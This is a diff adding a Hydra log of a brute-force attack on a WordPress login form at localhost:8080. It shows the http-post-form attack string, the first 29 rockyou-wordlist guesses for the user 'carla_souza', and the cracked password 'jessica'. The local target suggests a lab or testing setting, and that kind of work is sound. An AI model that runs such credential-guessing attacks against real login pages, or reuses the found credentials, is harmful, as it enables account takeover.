@@ -1,0 +1,38 @@
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-29 23:52:12
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-post-form://localhost:8080/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Acessar:F=está incorreta
+[ATTEMPT] target localhost - login "carla_souza" - pass "123456" - 1 of 14344398 [child 0] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "12345" - 2 of 14344398 [child 1] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "password" - 4 of 14344398 [child 3] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "iloveyou" - 5 of 14344398 [child 4] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "princess" - 6 of 14344398 [child 5] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "1234567" - 7 of 14344398 [child 6] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "rockyou" - 8 of 14344398 [child 7] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "12345678" - 9 of 14344398 [child 8] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "abc123" - 10 of 14344398 [child 9] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "nicole" - 11 of 14344398 [child 10] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "daniel" - 12 of 14344398 [child 11] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "babygirl" - 13 of 14344398 [child 12] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "monkey" - 14 of 14344398 [child 13] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "lovely" - 15 of 14344398 [child 14] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "jessica" - 16 of 14344398 [child 15] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "654321" - 17 of 14344398 [child 3] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "michael" - 18 of 14344398 [child 5] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "ashley" - 19 of 14344398 [child 10] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "qwerty" - 20 of 14344398 [child 13] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "111111" - 21 of 14344398 [child 2] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "iloveu" - 22 of 14344398 [child 1] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "000000" - 23 of 14344398 [child 6] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "michelle" - 24 of 14344398 [child 7] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "tigger" - 25 of 14344398 [child 8] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "sunshine" - 26 of 14344398 [child 4] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "chocolate" - 27 of 14344398 [child 12] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "password1" - 28 of 14344398 [child 14] (0/0)
+[ATTEMPT] target localhost - login "carla_souza" - pass "soccer" - 29 of 14344398 [child 11] (0/0)
+[8080][http-post-form] host: localhost   misc: /wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Acessar:F=está incorreta   login: carla_souza   password: jessica
+[STATUS] attack finished for localhost (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-29 23:52:18
